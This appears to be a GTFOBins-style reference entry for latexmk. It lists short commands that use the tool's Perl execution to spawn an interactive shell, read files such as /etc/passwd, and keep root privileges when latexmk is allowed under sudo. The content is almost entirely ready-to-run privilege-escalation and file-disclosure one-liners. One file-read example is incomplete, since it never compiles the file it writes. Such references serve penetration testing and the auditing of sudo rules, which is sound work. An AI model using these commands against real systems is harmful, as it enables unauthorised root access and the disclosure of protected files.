# GTFOBin: latexmk

This allows to execute `perl` code.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
latexmk -e 'exec "/bin/sh";'
```

```
latexmk -latex='/bin/sh #' /dev/null
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
```

The read file will be part of the output.

```
TF=$(mktemp)
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
strings tmp.dvi
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo latexmk -e 'exec "/bin/sh";'
```